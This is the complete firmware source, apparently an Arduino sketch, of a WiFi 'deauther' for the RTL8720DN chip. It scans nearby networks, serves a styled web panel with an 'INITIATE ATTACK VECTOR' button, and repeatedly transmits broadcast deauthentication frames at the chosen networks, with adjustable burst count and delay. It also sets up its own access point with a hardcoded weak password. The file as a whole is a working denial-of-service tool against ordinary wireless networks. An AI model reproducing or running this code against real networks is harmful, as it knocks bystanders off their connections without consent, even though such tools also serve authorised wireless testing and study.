#undef max
#include "vector"
#include "wifi_conf.h"
#include "map"
#include "src/packet-injection/packet-injection.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

void handleRoot(WiFiClient &client);
void handle404(WiFiClient &client);

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

char *ssid = "RTL8720dn-Deauther";
char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::map<int, std::vector<int>> deauth_channels;
std::vector<int> chs_idx;
uint32_t current_ch_idx = 0;
uint32_t sent_frames = 0;

WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

int frames_per_deauth = 5;
int send_delay = 5;
bool isDeauthing = false;
bool led = true;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ');
  if (path_start < 0) return "/";
  path_start += 1;
  int path_end = request.indexOf(' ', path_start);
  if (path_end < 0) return "/";
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;

    // Find the start of the body
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params; // Return an empty vector if no body found
    }
    body_start += 4;

    // Extract the POST data
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    // Loop through the key-value pairs
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value}); // Add the key-value pair to the vector
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    // Handle the last key-value pair
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }

    return post_params;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html");
  response += R"(
  <!DOCTYPE html>
  <html lang='en'>
  <head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>TERMINAL // RTL8720DN</title>
    <style>
      @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500&display=swap');
      
      :root {
        --accent: #00ffa3; --bg: #050508; --card: rgba(15, 17, 26, 0.7);
        --border: rgba(0, 255, 163, 0.2); --text: #e0e6ed;
      }

      * { box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
      
      body {
        background: var(--bg); color: var(--text); margin: 0; padding: 20px;
        background-image: 
          radial-gradient(circle at 50% 50%, #101525 0%, #050508 100%),
          linear-gradient(rgba(0, 255, 163, 0.02) 1px, transparent 1px),
          linear-gradient(90deg, rgba(0, 255, 163, 0.02) 1px, transparent 1px);
        background-size: 100% 100%, 40px 40px, 40px 40px;
      }

      .container { max-width: 1100px; margin: 0 auto; animation: scanline 6s linear infinite; }

      /* Header Style */
      .header {
        display: flex; justify-content: space-between; align-items: center;
        padding: 20px; border: 1px solid var(--border);
        background: var(--card); backdrop-filter: blur(10px);
        border-radius: 4px; margin-bottom: 20px; position: relative;
        overflow: hidden;
      }
      
      .header::before {
        content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 2px;
        background: linear-gradient(90deg, transparent, var(--accent), transparent);
        animation: flow 3s infinite;
      }

      .grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
      @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } }

      .panel {
        background: var(--card); border: 1px solid var(--border);
        border-radius: 4px; padding: 20px; backdrop-filter: blur(10px);
      }

      .panel-title {
        font-size: 0.8rem; color: var(--accent); text-transform: uppercase;
        letter-spacing: 2px; margin-bottom: 20px; display: flex; align-items: center;
      }

      .panel-title::before {
        content: '>'; margin-right: 10px; font-weight: bold;
      }

      /* Table Styles */
      table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
      th { text-align: left; padding: 12px; color: rgba(255,255,255,0.4); text-transform: uppercase; font-size: 0.7rem; }
      td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); }
      tr:hover td { background: rgba(0, 255, 163, 0.05); }

      /* Visual Signal Indicator */
      .rssi-bar {
        height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px;
        overflow: hidden; position: relative; width: 60px;
      }
      .rssi-fill {
        height: 100%; background: var(--accent); box-shadow: 0 0 10px var(--accent);
      }

      /* Interactive Elements */
      .btn {
        background: transparent; border: 1px solid var(--border); color: var(--accent);
        padding: 8px 16px; cursor: pointer; text-transform: uppercase;
        font-size: 0.7rem; transition: 0.3s;
      }
      .btn:hover { background: var(--accent); color: #000; box-shadow: 0 0 20px rgba(0, 255, 163, 0.4); }
      .btn-stop { border-color: #ff3e3e; color: #ff3e3e; width: 100%; margin-top: 10px; }
      .btn-stop:hover { background: #ff3e3e; color: #fff; box-shadow: 0 0 20px rgba(255, 62, 62, 0.4); }

      /* Input */
      input[type=text] {
        background: rgba(0,0,0,0.5); border: 1px solid var(--border);
        color: var(--accent); padding: 10px; border-radius: 2px; outline: none; width: 100%;
      }

      /* Custom Checkbox */
      .cb-container { position: relative; cursor: pointer; width: 20px; height: 20px; }
      .cb-container input { opacity: 0; position: absolute; }
      .cb-mark {
        position: absolute; top: 0; left: 0; height: 18px; width: 18px;
        border: 1px solid var(--accent); border-radius: 2px;
      }
      .cb-container input:checked ~ .cb-mark { background: var(--accent); }
      .cb-container input:checked ~ .cb-mark::after {
        content: 'LOCKED'; position: absolute; left: 25px; top: 0; font-size: 0.6rem; color: var(--accent);
      }

      /* Animations */
      @keyframes flow { 0% { left: -100%; } 100% { left: 100%; } }
      @keyframes scanline { 0% { box-shadow: inset 0 0 100px rgba(0,255,163,0.02); } 50% { box-shadow: inset 0 0 150px rgba(0,255,163,0.05); } 100% { box-shadow: inset 0 0 100px rgba(0,255,163,0.02); } }
      
      .status-dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; margin-right: 10px; }
      .pulse { animation: pulse-red 1.5s infinite; background: #ff3e3e; }
      @keyframes pulse-red { 0% { box-shadow: 0 0 0 0 rgba(255, 62, 62, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(255, 62, 62, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 62, 62, 0); } }
    </style>
  </head>
  <body>
    <div class='container'>
      <div class='header'>
        <div>
          <span style='font-size:1.2rem; font-weight:bold;'>CORE_DEAUTHER v3.0</span><br>
          <span style='font-size:0.6rem; color:rgba(255,255,255,0.4);'>LINK STATUS: ESTABLISHED // ENCRYPTED</span>
        </div>
        <div style='text-align: right;'>
          <form method='post' action='/rescan' style='display:inline;'><button class='btn'>Re-Scan</button></form>
          <form method='post' action='/refresh' style='display:inline;'><button class='btn'>Sync</button></form>
        </div>
      </div>

      <div class='grid'>
        <div class='panel'>
          <div class='panel-title'>Active Spectrum Nodes</div>
          <form method='post' action='/deauth'>
            <table>
              <thead>
                <tr><th>SSID</th><th>BSSID</th><th>RSSI</th><th style='width:40px'>TAG</th></tr>
              </thead>
              <tbody>)";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    int width = scan_results[i].rssi + 105;
    if (width < 5) width = 5; if (width > 100) width = 100;
    
    response += "<tr>";
    response += "<td><span style='color:var(--accent)'>" + String((scan_results[i].ssid.length() > 0) ? scan_results[i].ssid : "UNKNOWN_NODE") + "</span><br><small style='opacity:0.4'>CH " + String(scan_results[i].channel) + "</small></td>";
    response += "<td style='font-size:0.7rem; opacity:0.6'>" + scan_results[i].bssid_str + "</td>";
    response += "<td><div class='rssi-bar'><div class='rssi-fill' style='width:" + String(width) + "%'></div></div></td>";
    response += "<td><label class='cb-container'><input type='checkbox' name='network' value='" + String(i) + "'><span class='cb-mark'></span></label></td>";
    response += "</tr>";
  }

  response += R"(
              </tbody>
            </table>
            <button type='submit' class='btn' style='width:100%; margin-top:20px; height:45px; font-weight:bold; letter-spacing:3px;'>INITIATE ATTACK VECTOR</button>
          </form>
        </div>

        <div class='panel'>
          <div class='panel-title'>System Telemetry</div>
          <div style='margin-bottom:30px;'>
            <div style='font-size:0.7rem; color:rgba(255,255,255,0.4); margin-bottom:10px;'>PROCESS STATUS</div>)";
  
  if(isDeauthing) {
    response += "<div style='color:#ff3e3e'><span class='status-dot pulse'></span>ENGAGED</div>";
  } else {
    response += "<div style='color:var(--accent)'><span class='status-dot' style='background:var(--accent)'></span>LISTENING</div>";
  }

  response += R"(
            <div style='font-size:0.7rem; color:rgba(255,255,255,0.4); margin-top:20px; margin-bottom:10px;'>DATA FLOW</div>
            <div style='font-size:1.5rem;'>)";
  response += String(sent_frames);
  response += R"( <small style='font-size:0.6rem; color:rgba(255,255,255,0.4)'>PKTS</small></div>
          </div>

          <div class='panel-title'>Configuration</div>
          <form method='post' action='/setframes'>
            <input type='text' name='frames' placeholder='Burst Power'>
          </form>
          <form method='post' action='/setdelay' style='margin-top:10px'>
            <input type='text' name='delay' placeholder='Sequence Delay'>
          </form>

          <div class='panel-title' style='margin-top:30px;'>Hardware Control</div>
          <div style='display:flex; gap:10px;'>
            <form method='post' action='/led_enable' style='flex:1'><button class='btn' style='width:100%'>LED ON</button></form>
            <form method='post' action='/led_disable' style='flex:1'><button class='btn' style='width:100%'>LED OFF</button></form>
          </div>

          <form method='post' action='/stop'>
            <button class='btn btn-stop'>FORCE EMERGENCY STOP</button>
          </form>
        </div>
      </div>
      <div style='text-align:center; font-size:0.5rem; color:rgba(255,255,255,0.2); margin-top:30px; letter-spacing:5px;'>
        AUTHENTIC HARDWARE ACCESS // RTL8720DN CHIPSET
      </div>
    </div>
  </body>
  </html>)";
  client.write(response.c_str());
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());

  scanNetworks();

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  if (led) {
    digitalWrite(LED_R, HIGH);
  }
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    if (led) {
      digitalWrite(LED_G, HIGH);
    }
    String request;
    while (client.available()) {
      request += (char)client.read();
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/rescan") {
      client.write(makeRedirect("/").c_str());
      scanNetworks();
    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      deauth_channels.clear();
      chs_idx.clear();
      for (auto &param : post_data) {
        if (param.first == "network") {
          int idx = String(param.second).toInt();
          int ch = scan_results[idx].channel;
          deauth_channels[ch].push_back(idx);
          chs_idx.push_back(ch);
        } else if (param.first == "reason") {
          deauth_reason = String(param.second).toInt();
        }
      }
      if (!deauth_channels.empty()) {
        isDeauthing = true;
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/setframes") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "frames") {
          int frames = String(param.second).toInt();
          frames_per_deauth = frames <= 0 ? 5 : frames;
        }
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/setdelay") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "delay") {
          int delay = String(param.second).toInt();
          send_delay = delay <= 0 ? 5 : delay;
        }
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/stop") {
      deauth_channels.clear();
      chs_idx.clear();
      isDeauthing = false;
      client.write(makeRedirect("/").c_str());
    } else if (path == "/led_enable") {
      led = true;
      digitalWrite(LED_R, HIGH);
      client.write(makeRedirect("/").c_str());
    } else if (path == "/led_disable") {
      led = false;
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      client.write(makeRedirect("/").c_str());
    } else if (path == "/refresh") {
      client.write(makeRedirect("/").c_str());
    } else {
      handle404(client);
    }

    client.stop();
    if (led) {
      digitalWrite(LED_G, LOW);
    }
  }
  
  if (isDeauthing && !deauth_channels.empty()) {
    for (auto& group : deauth_channels) {
      int ch = group.first;
      if (ch == chs_idx[current_ch_idx]) {
        wext_set_channel(WLAN0_NAME, ch);

        std::vector<int>& networks = group.second;

        for (int i = 0; i < frames_per_deauth; i++) {
          if (led) {
            digitalWrite(LED_B, HIGH);
          }
          for (int idx : networks) {
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            sent_frames++;
          }
          delay(send_delay);
          if (led) {
            digitalWrite(LED_B, LOW);
          }
        }
      }
    }
    current_ch_idx++;
    if (current_ch_idx >= chs_idx.size()) {
      current_ch_idx=0;
    }
  }

  wext_set_channel(WLAN0_NAME, current_channel);
}